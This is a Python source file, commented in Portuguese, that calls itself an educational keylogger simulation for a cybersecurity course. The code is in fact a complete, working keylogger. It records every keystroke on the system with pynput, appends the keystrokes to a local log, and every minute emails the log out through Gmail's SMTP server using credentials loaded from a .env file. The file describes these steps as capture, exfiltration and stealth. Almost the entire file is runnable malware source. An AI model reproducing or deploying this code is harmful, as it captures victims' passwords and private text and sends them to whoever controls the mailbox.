"""
=============================================================================
== PROJETO: Simulação de Keylogger Educacional (Santander Cybersecurity)
== AUTOR: Revoluxti
==
== DESCRIÇÃO:
== Este script simula um keylogger para fins educacionais. Ele demonstra
== os principais componentes de um malware de captura de dados:
==
== 1. CAPTURA: Usa a biblioteca 'pynput' para escutar todas as teclas
==    digitadas no sistema.
== 2. ARMAZENAMENTO: Salva as teclas capturadas em um arquivo de log
==    local ('log.txt').
== 3. EXFILTRAÇÃO: Usa 'threading' para, em um intervalo de tempo
==    definido (ex: 60s), enviar o conteúdo do 'log.txt' para um
==    e-mail de "ataque" usando 'smtplib'.
== 4. FURTIVIDADE: Carrega credenciais de e-mail de um arquivo '.env'
==    para não as expor no código (boas práticas de segurança).
=============================================================================
"""

# --- [BLOCO 1: IMPORTAÇÕES] ---
# Importações de bibliotecas padrão e de terceiros
import os
import smtplib
import threading
from email.mime.text import MIMEText
from datetime import datetime
from dotenv import load_dotenv  # Para carregar segredos do .env
from pynput.keyboard import Listener, Key # A biblioteca principal do keylogger

# --- [BLOCO 2: CONFIGURAÇÃO E VARIÁVEIS GLOBAIS] ---

# Carrega as variáveis de ambiente (EMAIL_ADDRESS, EMAIL_PASSWORD) do .env
load_dotenv()

# --- Configurações de E-mail (puxadas do .env) ---
# Esta é a conta de e-mail (ex: Gmail) que enviará os logs.
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
# Esta é a "Senha de App" de 16 dígitos gerada pelo Google.
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
# Para este teste, o e-mail do destinatário é o mesmo do remetente.
RECIPIENT_EMAIL = EMAIL_ADDRESS

# --- Configurações do Log ---
# Nome do arquivo que armazenará temporariamente as teclas.
LOG_FILE = "log.txt"
# Intervalo (em segundos) para o envio do e-mail.
LOG_SEND_INTERVAL = 60  # 1 minuto

# --- Variável de Armazenamento Global ---
# Lista que armazena as teclas digitadas entre os envios de log.
key_strokes = []

# --- [BLOCO 3: FUNÇÕES DE CAPTURA DE TECLAS] ---

def on_press(key):
    """
    Função de "callback". É chamada automaticamente pela biblioteca 'pynput'
    toda vez que uma tecla física é pressionada.
    """
    global key_strokes # Informa que estamos usando a variável global

    try:
        # Tenta registrar o caractere normal (ex: 'a', 'b', '1', '@')
        key_strokes.append(key.char)
    except AttributeError:
        # Se falhar, é porque é uma tecla especial (ex: Shift, Ctrl, Enter)
        if key == Key.space:
            key_strokes.append(" ")
        elif key == Key.enter:
            key_strokes.append("\n[ENTER]\n")
        elif key == Key.tab:
            key_strokes.append("[TAB]")
        elif key == Key.backspace:
            key_strokes.append("[BACKSPACE]")
        else:
            # Outras teclas especiais (ex: F1, Alt, etc.)
            key_strokes.append(f" [{str(key).split('.')[-1].upper()}] ")
    
    # Após capturar a tecla, escreve-a imediatamente no arquivo de log
    write_to_log(key_strokes)
    # Limpa a lista para evitar duplicatas no arquivo
    key_strokes = []

def write_to_log(keys):
    """
    Esta função escreve (anexa) a lista de teclas no arquivo de log.
    O modo 'a' (append) garante que não apagamos o conteúdo anterior.
    """
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write("".join(keys))

# --- [BLOCO 4: FUNÇÃO DE EXFILTRAÇÃO (ENVIO DE E-MAIL)] ---

def send_log_email():
    """
    Esta é a função principal de exfiltração. Ela lê o log,
    conecta-se ao servidor SMTP do Google e envia o e-mail.
    """
    # Verifica se o arquivo de log existe e tem conteúdo.
    if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) == 0:
        print(f"[LOG]: Arquivo '{LOG_FILE}' está vazio ou não existe. Nenhum e-mail enviado.")
        return  # Sai da função se não houver nada para enviar

    try:
        # Lê o conteúdo do log
        with open(LOG_FILE, "r+", encoding="utf-8") as f:
            log_content = f.read()
            
            # --- Cria a mensagem de e-mail (MIMEText) ---
            subject = f"Log de Atividades - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            body = (f"## Log de Atividades (Simulação) ##\n\n{log_content}")
            
            msg = MIMEText(body)
            msg['Subject'] = subject
            msg['From'] = EMAIL_ADDRESS
            msg['To'] = RECIPIENT_EMAIL

            # --- Conecta ao servidor SMTP (Exemplo: Gmail) ---
            print(f"[LOG]: Conectando ao servidor SMTP...")
            # Usa 'with' para garantir que a conexão é fechada automaticamente
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()  # Inicia conexão segura (TLS)
                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD) # Autentica com a Senha de App
                server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, msg.as_string())
                print("[SUCCESS]: E-mail com o log enviado com sucesso!")
            
            # Limpa o arquivo de log após o envio para não enviar o mesmo conteúdo
            f.seek(0)
            f.truncate()

    except smtplib.SMTPAuthenticationError:
        print("[ERROR]: Falha na autenticação. Verifique seu e-mail e 'Senha de App'.")
    except Exception as e:
        print(f"[ERROR]: Falha ao enviar e-mail: {e}")

# --- [BLOCO 5: FUNÇÃO DE "TIMER" (THREADING)] ---

def start_reporting():
    """
    Esta função usa 'threading.Timer' para chamar a função 'send_log_email'
    repetidamente no intervalo definido (LOG_SEND_INTERVAL).
    
    O 'threading' é essencial para que o envio de e-mail (que pode ser lento)
    não trave a captura de teclas (que precisa ser imediata).
    """
    send_log_email()  # Envia o log imediatamente na primeira vez
    
    # Cria um timer que se repete
    timer = threading.Timer(LOG_SEND_INTERVAL, start_reporting)
    timer.daemon = True  # Permite que o programa feche mesmo se o timer estiver ativo
    timer.start()

# --- [BLOCO 6: EXECUÇÃO PRINCIPAL] ---

if __name__ == "__main__":
    """
    Este é o ponto de entrada do script.
    """
    print("--- Iniciando Simulação de Keylogger (Fins Educacionais) ---")
    
    # Verifica se as credenciais foram carregadas
    if not EMAIL_ADDRESS or not EMAIL_PASSWORD:
        print("[FATAL ERROR]: Credenciais de e-mail não encontradas no arquivo .env.")
    else:
        print(f"[CONFIG]: E-mail de remetente/destinatário: {EMAIL_ADDRESS}")
        print(f"[CONFIG]: Intervalo de envio: {LOG_SEND_INTERVAL} segundos.")
        print("\nAVISO: Pressione Ctrl+C para parar a simulação.\n")
        
        # Inicia o envio automático de logs em uma thread separada
        start_reporting()
        
        try:
            # Inicia o listener de teclado (bloqueia a thread principal)
            # O 'with' garante que o listener é parado corretamente ao sair
            with Listener(on_press=on_press) as listener:
                listener.join() # Mantém o script rodando para escutar
        except KeyboardInterrupt:
            # Captura o "Ctrl+C"
            print("\n[LOG]: Simulação interrompida pelo usuário (Ctrl+C).")
            # Envia o log final antes de sair
            print("[LOG]: Enviando log final...")
            send_log_email()
            print("[LOG]: Encerrado.")